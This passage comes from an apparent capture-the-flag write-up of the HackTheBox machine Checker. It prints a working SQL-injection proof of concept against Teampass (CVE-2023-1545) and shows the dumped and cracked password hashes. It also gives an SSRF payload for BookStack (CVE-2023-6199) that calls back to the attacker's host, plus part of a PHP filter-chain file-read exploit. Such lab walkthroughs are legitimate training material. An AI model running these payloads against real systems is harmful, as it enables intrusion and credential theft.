aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA) |_ 256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: 403 Forbidden 8080/tcp open http Apache httpd |_http-server-header: Apache |_http-title: 403 Forbidden Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds </span></code></pre></div></div> <p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH version</a>, the host is likely running Ubuntu 22.04 jammy. Apache seems to have it’s version masked (as I covered in detail in this <a href="/2025/04/12/htb-linkvortex.html#beyond-root---apache-config">Beyond Root for LinkVortex</a>).</p> <p>Both HTTP pages are returning 403. I’ll want to look more, but my first thought it of ModSecurity like in <a href="/2025/02/01/htb-trickster.html#beyond-root---modsecurity">Trickster</a>. Visiting in a browser or with <code class="language-plaintext highlighter-rouge">curl</code> shows a page.</p> <h3 id="subdomain-brute-force">Subdomain Brute Force</h3> <p>Port 80 redirects to <code class="language-plaintext highlighter-rouge">checker.htb</code>, which indicates there’s some kind of host-based routing going on. I’ll brute force for other subdomains that may reply differently using <code class="language-plaintext highlighter-rouge">ffuf</code>. However, even with a different User-Agent string, after only a handful of requests, the site starts returning <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/429">429 responses</a>, Too Many Requests.</p> <p>I’ll give up on brute force for now.</p> <h3 id="checkerhtb---tcp-80">checker.htb - TCP 80</h3> <h4 id="site">Site</h4> <p>Visiting port 80 in a browser redirects to <code class="language-plaintext highlighter-rouge">checker.htb/login</code>, which presents a site named BookStack:</p> <picture> <source type="image/webp" srcset="/img/image-20250222162150388.webp" /> <img loading="lazy" src="/img/image-20250222162150388.png" alt="image-20250222162150388" class="include_image " /> </picture> <p>Checking <code class="language-plaintext highlighter-rouge">/register</code> just redirects to <code class="language-plaintext highlighter-rouge">/login</code> with a flash message at the top:</p> <picture> <source type="image/webp" srcset="/img/image-20250222162227725.webp" /> <img loading="lazy" src="/img/image-20250222162227725.png" alt="image-20250222162227725" class="include_image " /> </picture> <p>The forgot password link has a form, and submitting it pops another message:</p> <picture> <source type="image/webp" srcset="/img/image-20250222162306118.webp" /> <img loading="lazy" src="/img/image-20250222162306118.png" alt="image-20250222162306118" class="include_image " /> </picture> <h4 id="tech-stack">Tech Stack</h4> <p>The HTTP response headers show not only Apache, but a lot more:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span> <span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 22 Feb 2025 21:08:29 GMT</span> <span class="na">Server</span><span class="p">:</span> <span class="s">Apache</span> <span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store, private</span> <span class="na">Location</span><span class="p">:</span> <span class="s">http://checker.htb/login</span> <span class="na">Content-Security-Policy</span><span class="p">:</span> <span class="s">frame-ancestors 'self'; frame-src 'self' https://*.draw.io https://*.youtube.com https://*.youtube-nocookie.com https://*.vimeo.com https://embed.diagrams.net; script-src http: https: 'nonce-ulwipyGI6SDrEYt4qL9Ph6ZR' 'strict-dynamic'; object-src 'self'; base-uri 'self'</span> <span class="na">Expires</span><span class="p">:</span> <span class="s">Sun, 12 Jul 2015 19:01:00 GMT</span> <span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">XSRF-TOKEN=eyJpdiI6Im44V0sxUTFWTVZoVExqaUErNFdOMEE9PSIsInZhbHVlIjoiYVd0Lzd3YnlmTTZrZFRTWWtwVThZNEVxOFRDZzVZa3lpWVphYlg4Q2t5cXdtT2hmd0QyQ2c3c05VUFFrY3I0ZDlUL2pUZjNkTTc0TVRvVTlZZkxXb2Yzb1ZWZlVxNHRRdkNUTm9CNytCc3ZCeEQwZ1U5Y05Qd2dZdUJjenFWTDYiLCJtYWMiOiJlYzcxOGRkNDczOTY4ZGYwYzJiNDczYmVhYjAxY2Q1M2E1NzAwZjU1MmM0ZWFiMjk1YzMwMTA2NjI5MzMxZmQ5IiwidGFnIjoiIn0%3D; expires=Sat, 22-Feb-2025 23:08:29 GMT; Max-Age=7200; path=/; samesite=lax</span> <span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">bookstack_session=eyJpdiI6IkZVUWs2S3VpY0tuV1A5dWZxdUoxTlE9PSIsInZhbHVlIjoieEZRaXBmNmFBYndjNHhkalZNeXVpeGVRV254eXhSQXBUaXB6aDczbUpDdWFHZm9hMmd6aVNTMG52RXZhKzJZRHBEUDdocVhZYm1RcStrWkZjMTBhZmc0d3FOY2lSNjVYY1lXc0M1QmdxSG9zOGc0M3g0ZGVvdCsxSlV5QlhMUXAiLCJtYWMiOiI0ZDEwZWFiMTQ5NTgxNjkxMWVlMTViYmVkZGEzZGQ0ODk0ZWE3YTZiODMwMDczYzM0MTljMGFjODQ0YzkyYmViIiwidGFnIjoiIn0%3D; expires=Sat, 22-Feb-2025 23:08:29 GMT; Max-Age=7200; path=/; httponly; samesite=lax</span> <span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span> <span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span> <span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span> <span class="na">Content-Length</span><span class="p">:</span> <span class="s">342</span> </code></pre></div></div> <p>The cookies look like the PHP Laravel framework. Guessing at the extension, <code class="language-plaintext highlighter-rouge">/index.php</code> redirects to <code class="language-plaintext highlighter-rouge">/login</code>, but <code class="language-plaintext highlighter-rouge">/login/index.php</code> loads the login page, so it’s very likely a PHP site.</p> <p>The 404 page is completely custom, so no help there.</p> <p><a href="https://www.bookstackapp.com/">BookStack</a> is a free and open source CMS, and it’s PHP using Laravel. The current version (as of Checker’s release) is v24.12.1.</p> <p>Looking in the HTML source, there are references to v23.10.2:</p> <picture> <source type="image/webp" srcset="/img/image-20250222181541624.webp" /> <img loading="lazy" src="/img/image-20250222181541624.png" alt="image-20250222181541624" class="include_image " /> </picture> <p>Given the rate limiting on the site, I’ll skip the directory brute force.</p> <h3 id="teampass---tcp-8080">Teampass - TCP 8080</h3> <h4 id="site-1">Site</h4> <p>The site on port 8080 is an instance of <a href="https://teampass.net/">Teampass</a>, an open source password manager:</p> <picture> <source type="image/webp" srcset="/img/image-20250222181720701.webp" /> <img loading="lazy" src="/img/image-20250222181720701.png" alt="image-20250222181720701" class="include_image " /> </picture> <p>Without creds, not much else to see here.</p> <h4 id="tech-stack-1">Tech Stack</h4> <p>Teampass is a PHP application, which is confirmed by loading the main page as <code class="language-plaintext highlighter-rouge">/index.php</code>. Looking through <a href="https://github.com/nilsteampassnet/TeamPass">the code</a> on GitHub, there is a <code class="language-plaintext highlighter-rouge">changelog.txt</code> at the root of the repo. That file exists on Checker as well:</p> <picture> <source type="image/webp" srcset="/img/image-20250529093505946.webp" /> <img loading="lazy" src="/img/image-20250529093505946.png" alt="image-20250529093505946" class="include_image " /> </picture> <p>It doesn’t give a more detailed version beyond v3. There is a copyright year, which is 2009-2022. Looking at <a href="https://github.com/nilsteampassnet/TeamPass/commits/master/changelog.txt">the history of that file</a>, I’ll note that the year was <a href="https://github.com/nilsteampassnet/TeamPass/commit/3b35001263928671c8d9868c8b429d7f09ff8ce3#diff-b40cd67182487ef24807d9c9268329d35fbd96aa2b0a9cae69e2e0d746b1c666">changed from 2022 to 2023</a> in version 3.0.0.22, which implies that this is older than that. It was <a href="https://github.com/nilsteampassnet/TeamPass/commit/91b93f72676dce206d0a41da4975794e27148ac6#diff-b40cd67182487ef24807d9c9268329d35fbd96aa2b0a9cae69e2e0d746b1c666">changed from 2021 to 2022</a> in version 3.0.0.10. So it’s reasonable to think the version is somewhere between those.</p> <p>All of the other files that have detailed version information seem to be PHP files that won’t show it.</p> <h2 id="shell-as-reader">Shell as reader</h2> <h3 id="recover-bootstack-creds">Recover BootStack Creds</h3> <h4 id="cve-2023-1545">CVE-2023-1545</h4> <p>I’ll search for Teampass CVEs in general to see if anything comes out. The <a href="https://www.cvedetails.com/vendor/11932/Teampass.html">CVEDetails page</a> shows nothing in 2024, but a few in 2023:</p> <picture> <source type="image/webp" srcset="/img/image-20250223055701635.webp" /> <img loading="lazy" src="/img/image-20250223055701635.png" alt="image-20250223055701635" class="include_image " /> </picture> <p>Of the 2023 vulns, XSS is not interesting at this point as I have no indication of a way to interact with the target. SQL injection is the most interesting.</p> <p>The <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1545">NVD description</a> of CVE-2023-1545 is not very descriptive, but it does match the version analysis from above:</p> <blockquote> <p>SQL Injection in GitHub repository nilsteampassnet/teampass prior to 3.0.0.23.</p> </blockquote> <p>Luckily, Snyk has a <a href="https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612">page on it</a> which offers a bit more:</p> <blockquote> <p>Affected versions of this package are vulnerable to SQL Injection due to improper input sanitization. Exploiting this vulnerability is possible via the TeamPass <code class="language-plaintext highlighter-rouge">/authorize</code> API endpoint through the <code class="language-plaintext highlighter-rouge">login</code> field.</p> </blockquote> <p>There is also a POC.</p> <h4 id="sqli-poc-analysis">SQLI POC Analysis</h4> <p>Before I run the POC, it’s worth taking a look at what’s it’s doing. It is a Bash script that takes a base url, which is uses to build a vulnerable url which is the <code class="language-plaintext highlighter-rouge">authorize</code> endpoint:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-lt</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;base-url&gt;"</span> <span class="nb">exit </span>1 <span class="k">fi </span><span class="nv">vulnerable_url</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">/api/index.php/authorize"</span> </code></pre></div></div> <p>There’s a check to see that the API is enabled:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">check</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2">"</span><span class="si">)</span> <span class="k">if </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$check</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"API usage is not allowed"</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"API feature is not enabled :-("</span> <span class="nb">exit </span>1 <span class="k">fi</span> </code></pre></div></div> <p>I can do this check, and it looks like I don’t get the “not allowed” message, which is good:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.10.11.56:8080/api/index.php/authorize <span class="go">{"error":"Method GET not supported"} </span></code></pre></div></div> <p>Next it makes a function that performs the SQL injection:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec_sql<span class="o">()</span> <span class="o">{</span> <span class="nv">inject</span><span class="o">=</span><span class="s2">"none' UNION SELECT id, '</span><span class="nv">$arbitrary_hash</span><span class="s2">', (</span><span class="nv">$1</span><span class="s2">), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"</span> <span class="nv">data</span><span class="o">=</span><span class="s2">"{</span><span class="se">\"</span><span class="s2">login</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">"</span><span class="nv">$inject</span><span class="se">\"</span><span class="s2">",</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">h4ck3d</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">apikey</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">foo</span><span class="se">\"</span><span class="s2">}"</span> <span class="nv">token</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"</span><span class="nv">$data</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.token'</span><span class="si">)</span> <span class="nb">echo</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$token</span>| <span class="nb">cut</span> <span class="nt">-d</span><span class="s2">"."</span> <span class="nt">-f2</span> | <span class="nb">base64</span> <span class="nt">-d</span> 2&gt;/dev/null | jq <span class="nt">-r</span> <span class="s1">'.public_key'</span><span class="si">)</span> <span class="o">}</span> </code></pre></div></div> <p>The injection is in the <code class="language-plaintext highlighter-rouge">login</code> parameter of the POST body sent to the <code class="language-plaintext highlighter-rouge">authorize</code> endpoint. The resulting data is leaked out through the JWT. It uses <code class="language-plaintext highlighter-rouge">cut</code> to get the middle section dividing on <code class="language-plaintext highlighter-rouge">.</code>, and then base64 decodes it.</p> <p>Now it uses that function to get the number of users in the system, and then to loop over those users getting their username and password hash:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">users</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT COUNT(*) FROM teampass_users WHERE pw != ''"</span><span class="si">)</span> <span class="nb">echo</span> <span class="s2">"There are </span><span class="nv">$users</span><span class="s2"> users in the system:"</span> <span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">seq </span>0 <span class="k">$((</span><span class="nv">$users</span><span class="o">-</span><span class="m">1</span><span class="k">))</span><span class="sb">`</span><span class="p">;</span> <span class="k">do </span><span class="nv">username</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span> <span class="nv">password</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$username</span><span class="s2">: </span><span class="nv">$password</span><span class="s2">"</span> <span class="k">done</span> </code></pre></div></div> <h4 id="sqli-poc-execution">SQLI POC Execution</h4> <p>Running the script works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>bash cve-2023-1545.sh <span class="go">Usage: cve-2023-1545.sh &lt;base-url&gt; </span><span class="gp">oxdf@hacky$ </span>bash cve-2023-1545.sh http://10.10.11.56:8080 <span class="go">There are 2 users in the system: admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy </span></code></pre></div></div> <h4 id="crack-hash">Crack Hash</h4> <p>I’ll save the two hashes to a file (removing the spaces):</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:$2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya bob:$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy </code></pre></div></div> <p>And pass it to <code class="language-plaintext highlighter-rouge">hashcat</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat teampass.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">--user</span> <span class="go">hashcat (v6.2.6) starting in autodetect mode ...[snip]... The following 4 hash-modes match the structure of your input hash: </span><span class="c"> # | Name | Category </span><span class="go"> ======+============================================================+====================================== 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce Please specify the hash-mode with -m [hash-mode]. ...[snip]... </span></code></pre></div></div> <p>No reason to think it’s anything other than plain bcrypt, so I’ll try with <code class="language-plaintext highlighter-rouge">-m 3200</code>. Very quickly, the hash for bob cracks:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat teampass.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">--user</span> <span class="nt">-m</span> 3200 <span class="go">hashcat (v6.2.6) starting ...[snip]... $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader ...[snip]... </span></code></pre></div></div> <h4 id="teampass-access">Teampass Access</h4> <p>With bob’s password, I’ll log into Teampass:</p> <picture> <source type="image/webp" srcset="/img/image-20250223061222526.webp" /> <img loading="lazy" src="/img/image-20250223061222526.png" alt="image-20250223061222526" class="include_image " /> </picture> <p>There are two entries for bob. The “bookstack login” entry has a password that reveals as “mYSeCr3T_w1kI_P4sSw0rD”:</p> <picture> <source type="image/webp" srcset="/img/image-20250223061315918.webp" /> <img loading="lazy" src="/img/image-20250223061315918.png" alt="image-20250223061315918" class="include_image " /> </picture> <p>The “ssh access” password is “hiccup-publicly-genesis” for the account reader:</p> <picture> <source type="image/webp" srcset="/img/image-20250223061350268.webp" /> <img loading="lazy" src="/img/image-20250223061350268.png" alt="image-20250223061350268" class="include_image " /> </picture> <h4 id="ssh">SSH</h4> <p>While it is dangerous and not something I would do in production, I typically use <code class="language-plaintext highlighter-rouge">sshpass</code> to show the password I’m logging in with in blog posts. Here, it just hangs:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> hiccup-publicly-genesis ssh reader@checker.htb <span class="go">Warning: Permanently added 'checker.htb' (ED25519) to the list of known hosts. </span></code></pre></div></div> <p>Running without <code class="language-plaintext highlighter-rouge">sshpass</code> shows why:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh reader@checker.htb <span class="go">(reader@checker.htb) Password: (reader@checker.htb) Verification code: </span></code></pre></div></div> <p>The account requires 2FA.</p> <h3 id="local-file-read">Local File Read</h3> <h4 id="bookstack-access">BookStack Access</h4> <p>With creds from Teampass, I’m able to log into BookStack as bob@checker.htb:</p> <picture> <source type="image/webp" srcset="/img/image-20250223062842674.webp" /> <img loading="lazy" src="/img/image-20250223062842674.png" alt="image-20250223062842674" class="include_image " /> </picture> <p>There are a couple existing pages. I’ll make sure to note a hint. In the “Basic Baskup with cp” article, there are example <code class="language-plaintext highlighter-rouge">bash</code> scripts showing recursive copying of files from <code class="language-plaintext highlighter-rouge">/home</code> to <code class="language-plaintext highlighter-rouge">/backup/home_backup</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20250224105920948.webp" /> <img loading="lazy" src="/img/image-20250224105920948.png" alt="image-20250224105920948" class="include_image " /> </picture> <h4 id="cve-2023-6199-background">CVE-2023-6199 Background</h4> <p>Searching for vulnerabilities in this version of BookStack returns many posts about CVE-2023-6199:</p> <picture> <source type="image/webp" srcset="/img/image-20250223063004978.webp" /> <img loading="lazy" src="/img/image-20250223063004978.png" alt="image-20250223063004978" class="include_image " /> </picture> <p>NVD <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6199">describes</a> it as:</p> <blockquote> <p>Book Stack version 23.10.2 allows filtering local files on the server. This is possible because the application is vulnerable to SSRF.</p> </blockquote> <p>The vulnerability is in the <code class="language-plaintext highlighter-rouge">html</code> parameter of the <code class="language-plaintext highlighter-rouge">/ajax/page/&lt;id&gt;/save-draft</code> endpoint. A blog post from fluid attacks, <a href="https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/">LFR via SSRF in BookStack: Beware of insecure-by-default libraries!</a>, walks through the vulnerability in detail, showing how an attacker-controller parameter in a HTTP POST request can get a provided URL into a call to <code class="language-plaintext highlighter-rouge">file_get_contents</code> if crafted correctly. This is server-side request forgery.</p> <p>Beyond that, the post mentions using the <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">Blind File Oracles</a> technique to use this to read files from the local machine.</p> <h4 id="ssrf-poc">SSRF POC</h4> <p>To test this out, I’ll click “Books” –&gt; “Create New Book”, fill out the form to create a book, and then click “New Page”:</p> <picture> <source type="image/webp" srcset="/img/image-20250224062243425.webp" /> <img loading="lazy" src="/img/image-20250224062243425.png" alt="image-20250224062243425" class="include_image " /> </picture> <p>Updating the page may inspire it to save the draft automatically, or I can click the three dots next to “Editing Draft” and then “Save Draft”.</p> <p>Burp shows that when that happens, there’s a PUT request to <code class="language-plaintext highlighter-rouge">/ajax/page/8/save-draft</code> (though the page number may vary):</p> <picture> <source type="image/webp" srcset="/img/image-20250224062414393.webp" /> <img loading="lazy" src="/img/image-20250224062414393.png" alt="image-20250224062414393" class="include_image " /> </picture> <p>I’ll send this request to repeater. For the payload, I want a base64-encoded URL:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"http://10.10.14.6/ssrf-poc"</span> | <span class="nb">base64</span> <span class="go">aHR0cDovLzEwLjEwLjE0LjYvc3NyZi1wb2M= </span></code></pre></div></div> <p>It is critical to include the <code class="language-plaintext highlighter-rouge">-n</code>, or else the string will decode with a trailing newline, and then won’t be recognized as a URL later by PHP.</p> <p>I’ll take the result (minus any trailing “=”) and wrap it in the payload shown in the POC exploit:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'data:image/png;base64,aHR0cDovLzEwLjEwLjE0LjYvc3NyZi1wb2M'</span><span class="nt">/&gt;</span> </code></pre></div></div> <p>I’ll put this in the <code class="language-plaintext highlighter-rouge">html</code> parameter in the PUT request and send it. Immediately there’s a request at my listening Python webserver from Checker:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.56 - - [24/Feb/2025 06:26:16] code 404, message File not found 10.10.11.56 - - [24/Feb/2025 06:26:16] "GET /ssrf-poc HTTP/1.1" 404 - </span></code></pre></div></div> <p>That’s SSRF exploitation.</p> <h4 id="filter-chains-oracle-poc">Filter Chains Oracle POC</h4> <p>The blind filter chains technique was made popular in a blog post from Synacktiv, <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">PHP filter chains: file read from error-based oracle</a>, which is built on a technique from a challenge in the DownUnder CTF 2022.</p> <p>The attack uses PHP filer chains to determine the contents of a file when the attacker can provide a URL that is passed to <code class="language-plaintext highlighter-rouge">file</code>, <code class="language-plaintext highlighter-rouge">hash_file</code>, <code class="language-plaintext highlighter-rouge">file_get_contents</code>, or <code class="language-plaintext highlighter-rouge">copy</code>. Typically these calls don’t print the data returned from them.</p> <p>There is also a <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">Python script POC</a> available for use. While it’s always a good idea to read and understand POCs before just running them, it’s especially true here as I’ll have to modify the script to so that it sends the URL in a base64-encoded image tag.</p> <p>The <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle_exploit.py">main script</a>, <code class="language-plaintext highlighter-rouge">filters_chain_oracle_exploit.py</code>, is mostly handling passed in args before eventually using <code class="language-plaintext highlighter-rouge">Requestor</code> and <code class="language-plaintext highlighter-rouge">RequestorBruteforcer</code> (<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle/core/requestor.py">source</a>) objects to perform the attacks:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1"># Attack launcher </span> <span class="n">self</span><span class="p">.</span><span class="n">requestor</span> <span class="o">=</span> <span class="nc">Requestor</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="nb">file</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">parameter</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">verb</span><span class="p">,</span> <span class="n">in_chain</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">proxy</span><span class="p">,</span> <span class="n">time_based_attack</span><span class="p">,</span> <span class="n">delay</span><span class="p">,</span> <span class="n">json_input</span><span class="p">,</span> <span class="n">match</span><span class="p">)</span> <span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span> <span class="o">=</span> <span class="nc">RequestorBruteforcer</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">requestor</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span> <span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">signal_handler</span><span class="p">)</span> <span class="c1"># Auto fallback to time based attack </span> <span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="nf">bruteforce</span><span class="p">()</span> <span class="c1"># Result parsing </span> <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="n">base64</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] File {} leak is finished!</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">requestor</span><span class="p">.</span><span class="n">file_to_leak</span><span class="p">))</span> <span class="nf">print</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="n">base64</span><span class="p">)</span> <span class="nf">print</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="n">data</span><span class="p">)</span> <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">log_file</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="nf">log_in_file</span><span class="p">(</span><span class="sh">"</span><span class="s"># The following data was leaked from {} from the file {}</span><span class="se">\n</span><span class="s">{}</span><span class="se">\n</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">requestor</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">requestor</span><span class="p">.</span><span class="n">file_to_leak</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)))</span> <span class="nf">exit</span><span class="p">()</span> <span class="k">else</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] File {} is either empty, or the exploit did not work :(</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">requestor</span><span class="p">.</span><span class="n">file_to_leak</span><span class="p">))</span> <span class="n">time_based_attack</span> <span class="o">=</span> <span class="mi">1</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Auto fallback to time based attack</span><span class="sh">"</span><span class="p">)</span> <span class="n">self</span><span class="p">.</span><span class="n">requestor</span> <span class="o">=</span> <span class="nc">Requestor</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="nb">file</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">parameter</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">verb</span><span class="p">,</span> <span class="n">in_chain</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">proxy</span><span class="p">,</span> <span class="n">time_based_attack</span><span class="p">,</span> <span class="n">delay</span><span class="p">,</span> <span class="n">json_input</span><span class="p">,</span> <span class="n">match</span><span class="p">)</span> <span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span> <span class="o">=</span> <span class="nc">RequestorBruteforcer</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">requestor</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span> <span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="nf">bruteforce</span><span class="p">()</span> <span class="k">if</span> <span class="n">verb</span> <span class="o">==</span> <span class="n">Verb</span><span class="p">.</span><span class="n">GET</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] You passed your payload on a GET parameter, the leak might be partial! (~135 chars max by default)</span><span class="sh">"</span><span class="p">)</span> <span class="nf">print</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="n">base64</span><span class="p">)</span> <span class="nf">print</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bruteforcer</span><span class="p">.</span><span class="n">data</span><span class="p">)</span> </code></pre></div></div> <p>The requested file is only passed into the dunder init function of the <code 